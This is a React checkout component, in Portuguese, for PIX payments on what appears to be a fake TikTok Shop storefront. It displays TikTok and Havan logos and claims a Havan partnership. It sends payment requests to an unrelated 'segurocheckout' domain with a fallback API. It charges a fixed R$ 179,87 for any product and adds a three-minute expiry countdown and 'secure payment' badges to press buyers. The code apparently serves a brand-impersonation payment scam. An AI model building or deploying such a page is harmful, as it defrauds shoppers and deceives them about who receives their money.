"use client";

import React, { useState, useEffect, useCallback } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";
import { Copy, Check, Loader2, ArrowLeft, QrCode, ShieldCheck, ChevronDown, ChevronUp } from 'lucide-center';
import { QRCodeSVG } from "qrcode.react";
import { Product } from '@/data/products';
import { trackTikTokEvent } from '@/utils/tiktok-pixel';
import { supabase } from "@/integrations/supabase/client";

interface PixResponse {
  qrCode: string;
  qrcode: string;
  id: string;
}

const PixPayment: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [copied, setCopied] = useState(false);
  const [pixData, setPixData] = useState<PixResponse | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [paymentApproved, setPaymentApproved] = useState(false);
  const [showQr, setShowQr] = useState(false);
  const [apiUsada, setApiUsada] = useState<string>("payevo");

  const [timeLeft, setTimeLeft] = useState(180);
  const [isExpired, setIsExpired] = useState(false);

  useEffect(() => {
    if (location.state?.product) {
      setProduct(location.state.product);
    } else {
      navigate('/');
    }
  }, [location.state, navigate]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const createPixPayment = useCallback(async () => {
    try {
      setLoading(true);
      setError(null);
      setTimeLeft(180);
      setIsExpired(false);

      // Preço atualizado conforme solicitado: 179,87
      const pixValue = 179.87;
      const amountInCents = Math.round(pixValue * 100);

      const payload = {
        amount: amountInCents,
        items: [{
          title: product?.title || "Produto TikTok Shop",
          unitPrice: amountInCents,
          quantity: 1,
          tangible: true,
          externalRef: `Pedido${Date.now()}`,
        }],
        pix: { expiresInDays: 1 },
        paymentMethod: "PIX",
      };

      let response;
      let currentApi = "payevo";

      try {
        response = await fetch("https://oferta.segurocheckout.online/api/pix/payevo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (!response.ok) throw new Error();
      } catch {
        currentApi = "blackcat";
        response = await fetch("https://oferta.segurocheckout.online/api/pix/blackcat", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      }

      if (!response.ok) throw new Error("Erro ao gerar PIX");

      const data = await response.json();
      setPixData(data);
      setApiUsada(currentApi);
    } catch (err) {
      setError("Erro ao gerar código PIX. Tente novamente.");
    } finally {
      setLoading(false);
    }
  }, [product]);

  useEffect(() => {
    if (product) createPixPayment();
  }, [product, createPixPayment]);

  useEffect(() => {
    if (loading || paymentApproved || isExpired) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [loading, paymentApproved, isExpired]);

  useEffect(() => {
    if (!pixData?.id || paymentApproved) return;
    const sseUrl = `https://oferta.segurocheckout.online/api/pix/sse/${apiUsada}/${pixData.id}`;
    const eventSource = new EventSource(sseUrl);

    eventSource.onmessage = async (event) => {
      try {
        const payload = JSON.parse(event.data);
        if (payload.type === "payment_status_update" && payload.data?.status) {
          const status = String(payload.data.status).toUpperCase();
          if (status === "APPROVED" || status.includes("PAID") || status.includes("SUCCESS")) {
            setPaymentApproved(true);
            
            if (location.state?.orderId) {
              await supabase
                .from('orders')
                .update({ status: 'PAID' })
                .eq('id', location.state.orderId);
            }

            trackTikTokEvent('Purchase', {
              content_id: product?.slug,
              content_type: 'product',
              content_name: product?.title,
              value: 179.87,
              currency: 'BRL',
              quantity: 1
            });

            eventSource.close();
          }
        }
      } catch (err) {}
    };

    return () => eventSource.close();
  }, [pixData?.id, paymentApproved, apiUsada, product, location.state?.orderId]);

  const handleCopy = async () => {
    if (pixData?.qrcode) {
      await navigator.clipboard.writeText(pixData.qrcode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  if (!product) return null;

  return (
    <div className="min-h-screen bg-[#F8F8F8] flex flex-col items-center">
      <div className="w-full max-w-[600px] bg-white border-b h-12 flex items-center px-4 sticky top-0 z-50">
        <button onClick={() => navigate(-1)} className="p-1">
          <ArrowLeft size={24} className="text-gray-900" />
        </button>
        <div className="flex-grow flex justify-center">
          <img src="https://i.ibb.co/TD1mSYdD/tiktok-1.png" alt="TikTok" className="h-6" />
        </div>
        <div className="w-8"></div>
      </div>

      <main className="w-full max-w-[600px] p-4 space-y-4">
        <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-100">
          <div className="flex items-center space-x-3 mb-4">
            <div className="w-12 h-12 rounded-lg bg-gray-50 flex-shrink-0 border p-1">
              <img src={product.media[0].src} className="w-full h-full object-contain" />
            </div>
            <div className="flex-grow overflow-hidden">
              <h3 className="text-[13px] font-bold text-gray-900 truncate">{product.title}</h3>
              <p className="text-[11px] text-gray-400">Pagamento via PIX</p>
            </div>
          </div>

          <div className="flex flex-col items-center py-2 border-t border-b border-gray-50 my-4">
            <span className="text-[12px] text-gray-500 mb-1">Total a pagar</span>
            <span className="text-[32px] font-bold text-[#FF2C55]">R$ 179,87</span>
          </div>

          <div className="flex flex-col items-center space-y-4">
            <div className="flex items-center justify-center space-x-2 text-[#00BFA5]">
              <ShieldCheck size={16} className="fill-[#00BFA5]/10" />
              <span className="text-[12px] font-bold uppercase">Pagamento Seguro</span>
            </div>
            
            <div className="flex items-center space-x-3 bg-white px-3 py-2 rounded-xl border border-[#F1F1F1] shadow-sm w-full">
              <div className="w-10 h-10 rounded-full bg-white border border-gray-100 flex items-center justify-center overflow-hidden shrink-0 shadow-inner">
                <img 
                  src="https://logodownload.org/wp-content/uploads/2015/05/havan-logo-0.png" 
                  alt="Havan" 
                  className="w-full h-full object-contain scale-110" 
                />
              </div>
              <p className="text-[13px] text-gray-700 leading-tight font-medium">
                Distribuído e entregue por <span className="font-bold text-gray-900">Havan</span> em parceria com o <span className="font-bold text-gray-900">TikTok Shop</span>
              </p>
            </div>
          </div>
          
          <div className="text-center mt-4">
            <span className="text-[11px] text-gray-400">
              O código expira em <span className="font-bold text-gray-600">{formatTime(timeLeft)}</span>
            </span>
          </div>
        </div>

        <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 text-center">
          {loading ? (
            <div className="flex flex-col items-center py-8">
              <Loader2 className="animate-spin text-[#FF2C55] mb-3" size={32} />
              <p className="text-[13px] text-gray-500">Gerando seu código PIX...</p>
            </div>
          ) : error ? (
            <div className="py-6">
              <p className="text-red-500 text-[13px] mb-4">{error}</p>
              <Button onClick={createPixPayment} className="bg-[#FF2C55] rounded-full">Tentar novamente</Button>
            </div>
          ) : paymentApproved ? (
            <div className="py-8 space-y-3 animate-in fade-in zoom-in duration-500">
              <div className="w-16 h-16 bg-[#00BFA5] rounded-full flex items-center justify-center mx-auto mb-4">
                <Check size={32} className="text-white" />
              </div>
              <h2 className="text-[18px] font-bold text-gray-900">Pagamento Confirmado!</h2>
              <p className="text-[13px] text-gray-500 px-6">Seu pedido já está sendo processado. Acompanhe em seu e-mail.</p>
              <Button onClick={() => navigate('/')} className="bg-[#FF2C55] rounded-full w-full mt-4">Voltar para a loja</Button>
            </div>
          ) : (
            <div className="space-y-5">
              <div className="space-y-3 text-left">
                <h4 className="text-[14px] font-bold text-gray-900">PIX Copia e Cola</h4>
                <div className="bg-[#F8F8F8] p-3 rounded-xl border border-dashed border-gray-200 relative">
                  <p className="text-[11px] text-gray-500 break-all line-clamp-2 pr-10">
                    {pixData?.qrcode}
                  </p>
                  <button 
                    onClick={handleCopy}
                    className="absolute right-3 top-1/2 -translate-y-1/2 p-2 bg-white rounded-lg shadow-sm border"
                  >
                    {copied ? <Check size={18} className="text-[#00BFA5]" /> : <Copy size={18} className="text-gray-400" />}
                  </button>
                </div>
              </div>

              <Button 
                onClick={handleCopy}
                className={cn(
                  "w-full h-12 rounded-full font-bold text-[15px] transition-all",
                  copied ? "bg-[#00BFA5] hover:bg-[#00BFA5]" : "bg-[#FF2C55] hover:bg-[#E0254B]"
                )}
              >
                {copied ? "Código Copiado!" : "Copiar Código PIX"}
              </Button>

              <button 
                onClick={() => setShowQr(!showQr)}
                className="flex items-center justify-center space-x-2 w-full py-2 text-[13px] font-medium text-gray-500"
              >
                <QrCode size={18} />
                <span>{showQr ? "Esconder QR Code" : "Mostrar QR Code"}</span>
                {showQr ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
              </button>

              {showQr && (
                <div className="pt-4 animate-in slide-in-from-top-4 duration-300">
                  <div className="bg-white p-3 rounded-xl border inline-block">
                    <QRCodeSVG value={pixData?.qrcode || ""} size={160} />
                  </div>
                  <p className="text-[11px] text-gray-400 mt-3">Escaneie este código com o app do seu banco</p>
                </div>
              )}
            </div>
          )}
        </div>

        <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-100">
          <h4 className="text-[14px] font-bold text-gray-900 mb-4">Como pagar?</h4>
          <div className="space-y-4">
            {[
              { step: 1, text: "Abra o aplicativo do seu banco favorito." },
              { step: 2, text: "Vá na seção PIX e escolha 'Pagar' ou 'Copia e Cola'." },
              { step: 3, text: "Cole o código ou escaneie o QR Code e confirme." },
              { step: 4, text: "A confirmação é imediata e seu pedido será liberado." }
            ].map((item) => (
              <div key={item.step} className="flex items-start space-x-3">
                <div className="w-5 h-5 rounded-full bg-[#F1F1F1] flex items-center justify-center text-[11px] font-bold text-gray-500 shrink-0 mt-0.5">
                  {item.step}
                </div>
                <p className="text-[12px] text-gray-600 leading-tight">{item.text}</p>
              </div>
            ))}
          </div>
        </div>
      </main>

      <div className="mt-4 mb-8">
        <p className="text-[11px] text-gray-400">🛡️ Pagamento processado de forma segura</p>
      </div>
    </div>
  );
};

export default PixPayment;